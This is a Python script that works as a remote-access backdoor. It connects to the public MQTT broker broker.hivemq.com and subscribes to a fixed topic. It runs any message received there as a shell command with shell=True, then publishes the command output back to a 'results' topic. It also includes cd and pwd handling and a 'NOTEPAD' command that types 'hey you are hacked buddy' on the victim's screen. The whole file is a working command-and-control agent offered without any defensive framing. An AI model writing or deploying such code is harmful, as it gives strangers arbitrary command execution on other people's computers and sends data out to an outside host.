import paho.mqtt.client as mqtt
from datetime import datetime
import pyautogui
import time
import subprocess
import os

message_Global = ""

def print_time():
    current_time = datetime.now().strftime("%H:%M:%S")
    client.publish("results", current_time)

def notes():
    print("command notepad was used")
    pyautogui.press("win")
    pyautogui.typewrite('notepad')
    pyautogui.press('enter')
    time.sleep(2)
    pyautogui.typewrite('hey you are hacked buddy')
    


# Function to handle `cd` command
def change_directory(path):
    try:
        # Sanitize and validate the path
        path = path.strip()  # Remove leading and trailing whitespace/newlines
        if not path:
            client.publish("results", "Error: No path provided.")
            return
        
        # Validate the path
        if os.path.exists(path):
            os.chdir(path)
            current_dir = os.getcwd()
            client.publish("results", f"Changed directory to: {current_dir}")
        else:
            client.publish("results", f"Error: The path '{path}' does not exist.")
    except Exception as e:
        client.publish("results", f"Error changing directory: {str(e)}")

# Function to get current working directory
def get_current_directory():
    current_dir = os.getcwd()
    client.publish("results", f"Current directory: {current_dir}")

# Callback function to handle messages
def mqtt_message(client, userdata, message):
    decoded_message = message.payload.decode().strip()  # Strip whitespace
    print(f"Received message: '{decoded_message}' on topic {message.topic}")

    # Use decoded_message directly instead of setting message_Global
    if decoded_message.upper() == "CLOCK":
        print_time()
    elif decoded_message.upper() == "NOTEPAD":
        notes()
    elif decoded_message.startswith("cd "):  # Handle 'cd' command
        path = decoded_message.split(" ", 1)[1]  # Get the path part of the command
        change_directory(path)
    elif decoded_message.lower() == "pwd":  # Handle 'pwd' command
        get_current_directory()
    else:
        # Otherwise, try to run it as a command
        try:
            process = subprocess.Popen(decoded_message, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate(timeout=10)  # Add a timeout to prevent hanging
            if stdout:
                print(f"Command output: {stdout}")
                client.publish("results", stdout)
            if stderr:
                print(f"Command error: {stderr}")
                client.publish("results", stderr)
            if not stdout and not stderr:
                print("Command executed but no output returned.")
                client.publish("results", "Command executed but no output returned.")
        except subprocess.TimeoutExpired:
            print("Command timed out.")
            client.publish("results", "Command timed out.")
        except FileNotFoundError as e:
            error_message = f"Error: {str(e)}"
            print(error_message)
            client.publish("results", error_message)
        except Exception as e:
            error_message = f"Unhandled exception: {str(e)}"
            print(error_message)
            client.publish("results", error_message)

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("Connected successfully.")
        client.subscribe("mike31boss")
    else:
        print(f"Failed to connect, return code {rc}")

# Create a new MQTT client instance with Websockets
client = mqtt.Client(client_id="clientId-roJiP6Zx2", transport="websockets")

# Set the callback functions
client.on_message = mqtt_message
client.on_connect = on_connect

# Connect to the broker
try:
    print("Connecting to MQTT...")
    client.connect("broker.hivemq.com", 8000, keepalive=60)
except Exception as e:
    print(f"Connection failed: {e}")

# Start the loop to process received messages
client.loop_start()

# Keep the script running to listen for messages
try:
    while True:
        pass
except KeyboardInterrupt:
    print("Disconnecting...")
    client.loop_stop()
    client.disconnect()
    print("Disconnected!")
